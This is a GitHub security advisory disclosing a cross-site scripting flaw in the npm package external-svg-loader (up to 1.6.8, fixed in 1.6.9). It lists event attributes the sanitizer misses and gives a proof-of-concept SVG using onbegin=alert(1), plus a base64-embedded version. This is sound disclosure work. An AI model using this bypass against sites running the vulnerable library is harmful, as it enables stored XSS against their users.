# Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') in external-svg-loader

Critical

[shubhamjain](/shubhamjain)
published
GHSA-xc2r-jf2x-gjr8
Aug 14, 2023

## Package

npm

external-svg-loader
([npm](/advisories?query=ecosystem%3Anpm))

## Affected versions

<=1.6.8

## Patched versions

1.6.9

## Description

### Summary

According to the [docs](https://github.com/shubhamjain/svg-loader/tree/main#2-enable-javascript), svg-loader will strip all JS code before injecting the SVG file for security reasons but the input sanitization logic is not sufficient and can be trivially bypassed. This allows an attacker to craft a malicious SVG which can result in XSS.

### Details

When trying to sanitize the svg the lib [removes event attributes](https://github.com/shubhamjain/svg-loader/blob/main/svg-loader.js#L125-L128) such as `onmouseover`, `onclick` but the list of events is not exhaustive. Here's a list of events not removed by svg-loader.

`onafterscriptexecute, onbeforecopy, onbeforecut, onbeforescriptexecute, onbeforetoggle, onbegin, onbounce, onend, onfinish, onfocusin, onfocusout, onmousewheel, onpointerrawupdate, onrepeat, onsearch, onshow, onstart, ontoggle(popover), ontouchend, ontouchmove, ontouchstart`

As you can see in the POC we can use `onbegin` in `animate` tag to execute JS code without needing to add `data-js="enabled"`.

### PoC

```
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <animate onbegin=alert(1) attributeName=x dur=1s>
</svg>
```

```
<html>
    <head>
        <script src="./dist/svg-loader.js" type="text/javascript"></script>
    </head>
    <body>
        <svg data-src="data:image/svg+xml;base64,PHN2ZyB2ZXJzaW9uPSIxLjEiIGJhc2VQcm9maWxlPSJmdWxsIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogIDxwb2x5Z29uIGlkPSJ0cmlhbmdsZSIgcG9pbnRzPSIwLDAgMCw1MCA1MCwwIiBmaWxsPSIjMDA5OTAwIiBzdHJva2U9IiMwMDQ0MDAiLz4KICA8YW5pbWF0ZSBvbmJlZ2luPWFsZXJ0KDEpIGF0dHJpYnV0ZU5hbWU9eCBkdXI9MXM+Cjwvc3ZnPgo="></svg>
    </body>
</html>
```
### Impact

Any website which uses external-svg-loader and allows its users to provide svg src, upload svg files would be susceptible to stored XSS attack.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
